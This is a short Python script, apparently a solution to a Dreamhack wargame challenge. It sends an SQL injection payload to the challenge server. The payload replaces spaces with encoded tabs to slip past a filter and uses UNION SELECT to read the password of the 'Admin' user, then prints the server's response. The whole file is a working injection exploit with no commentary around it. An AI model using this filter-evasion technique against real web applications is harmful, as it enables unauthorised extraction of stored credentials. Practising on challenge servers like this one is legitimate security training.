import requests

url="http://host3.dreamhack.games:12196"
param=f"'%09Union%09Select%09null,upw,null%09From%09user%09where%09uid=\"Admin\"%23"

res = requests.get(f"{url}/?uid={param}")

print(res.status_code,res.text)